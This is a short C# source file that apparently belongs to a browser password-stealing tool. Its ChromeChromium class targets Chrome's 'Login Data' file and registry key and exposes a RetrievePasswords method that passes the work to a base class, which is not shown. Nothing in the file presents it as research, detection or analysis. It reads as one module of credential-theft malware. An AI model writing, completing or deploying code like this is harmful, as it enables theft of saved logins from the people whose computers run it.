namespace xoxoxo.Chromium
{
    internal sealed class ChromeChromium : ChromiumBase
    {
        public ChromeChromium()
        {
            SetValues();
        }

        private void SetValues()
        {
            ActualDataPath = LocData + "\\Google\\Chrome\\User Data\\Default\\Login Data";
            RegistryPath = "SOFTWARE\\Google\\Chrome";
        }

        public void RetrievePasswords()
        {
            RetrieveData();
        }
    }
}